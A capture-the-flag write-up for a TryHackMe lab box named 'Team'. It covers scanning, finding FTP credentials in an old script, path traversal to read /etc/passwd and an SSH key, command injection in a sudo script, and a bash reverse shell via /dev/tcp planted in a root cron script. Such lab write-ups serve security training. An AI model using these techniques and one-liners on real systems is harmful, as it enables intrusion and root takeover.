#### 1. Scanning

```
nmap -Pn -A 10.10.230.154
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-06 06:39 EST
Nmap scan report for 10.10.230.154
Host is up (0.054s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.21 seconds
```                                                                      

<br />

#### 2. Enumeration

I tried gobuster, robots.txt, all ports scanning, also checked if ftp is accessible by `anonymous` but nothing worked out.

There is an Apache2 welcome page only on 80, so I added `team.thm` and IP to `/etc/hosts`, reloaded and another one opened.

I see no hidden directories, mails or links so it's time for gobuster.

<br />

#### 3. Gobuster

- `/robots.txt` has a name `dale` --> I run hydra to bruteforce ftp with that username

`/scripts` directory which is not accessible, however rerunning gobuster gives a hidden text file `http://team.thm/scripts/script.txt` which says

```
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

I started to run the script many times but without success and thought I missed something. Last sentence mentions "old script was modified cause of creds"

It is a standard practique to change filename to `.old` extension, so rerunnig gobuster, it found `script.old` which I downloaded to my machine and opened it:

```
cat script.txt    
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```

Credentials for ftp are `ftpuser:T3@m$h@r3`

<br />

#### 4. FTP

I access ftp and there is a file in `workshare` named `New_site.txt` which says:


```
Dale
	I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 
```

It means that there is hidden website `dev.team.thm` 

<br />

#### 5. Exploring hidden website `dev.team.thm`

After checking a hint, it seems that path traversal is possible so I typed

`http://dev.team.thm/script.php?page=../../../../../etc/passwd`

and fortunately it showed me content of `/etc/password`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
```

After getting this I tried running many filters as well as reading /etc/shadow or apache logs but nothing worked out.

However, when I thought about viewing `user.txt` it worked:

`http://dev.team.thm/script.php?page=../../../../../home/dale/user.txt`

Additionally, I found out it's possible to view`etc/ssh/sshd_config`

`view-source:http://dev.team.thm/script.php?page=../../../../../etc/ssh/sshd_config`

and author of a box left `dale`s private key so I download it to my machine and login to machine

<br />

#### 6. Getting root

First things first, so as always I check `sudo -l`

```
 sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

`dale` can run a script as `gyles`

```
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

Once we type `/bin/bash` second time, script will stop but we will be `gyles`. 

Then we only need to run interactive python command and we are logged as `gyles`

```
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: hello
Enter 'date' to timestamp the file: /bin/bash
The Date is hello
python3 -c 'import pty;pty.spawn("/bin/bash")'
gyles@TEAM:~$ 
```
<br />

Hint says that there is some process ran by root. Therefore I copy and run `pspy64s` so it quickly finds a script:

```
2021/03/08 11:21:01 CMD: UID=0    PID=1305   | /bin/bash /opt/admin_stuff/script.sh 
2021/03/08 11:21:01 CMD: UID=0    PID=1304   | /bin/bash /opt/admin_stuff/script.sh 
```

```
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```

I checked permissions of both scripts and it is possible to modify second as `gyles` is in `admin`

```
gyles@TEAM:/opt/admin_stuff$ ls -al /usr/local/sbin/dev_backup.sh
-rwxr-xr-x 1 root root 64 Jan 17 19:42 /usr/local/sbin/dev_backup.sh

gyles@TEAM:/opt/admin_stuff$ ls -al /usr/local/bin/main_backup.sh
-rwxrwxr-x 1 root admin 65 Jan 17 20:36 /usr/local/bin/main_backup.sh
```

```
gyles@TEAM:~$ id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
```

I delete the script and recreate it with bash one liner only so it looks liks this:

```
cat  /usr/local/bin/main_backup.sh

bash -i &>/dev/tcp/10.11.30.36/4444 <&1
```

There needs to be netcat running in another terminal, so I become root after minute passes

```
udo nc -lvnp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [10.11.30.36] from (UNKNOWN) [10.10.20.86] 34758
bash: cannot set terminal process group (1554): Inappropriate ioctl for device
bash: no job control in this shell
root@TEAM:~# cat /root/root.txt	
cat /root/root.txt
THM{fhqbznavfonq}
root@TEAM:~# 
```








